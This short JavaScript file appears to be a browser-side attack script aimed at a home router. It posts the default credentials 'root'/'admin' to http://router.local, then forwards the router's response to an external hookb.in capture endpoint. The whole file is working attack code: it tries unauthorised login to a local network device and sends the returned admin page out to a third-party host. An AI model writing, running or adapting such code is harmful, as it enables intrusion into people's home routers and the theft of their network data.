const ROUTER = "http://router.local";
const ENDPOINT = "https://hookb.in/XkozB9BEQ6hDYMQQEw8Z";

function forwardResponse(res) {
	let fwdxhr = new XMLHttpRequest();
	fwdxhr.open("POST", ENDPOINT, true);
	fwdxhr.setRequestHeader("Content-Type", "text/html");
	fwdxhr.setRequestHeader("X-Requested-With", "XMLHttpRequest");
	/*const data = JSON.stringify({
		"data": res,
	});*/
	fwdxhr.send(res);
}

//forwardResponse("foo");

let xhr = new XMLHttpRequest();

xhr.onreadystatechange = function() {
	if (xhr.readyState === 4) {
		forwardResponse(xhr.response)
	}
}

// Initial request to get main.html
//xhr.open("GET", ROUTER, true);
//xhr.send('');

const formParams = "username=root&pin=admin";

xhr.open("POST", ROUTER, true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.send(formParams);
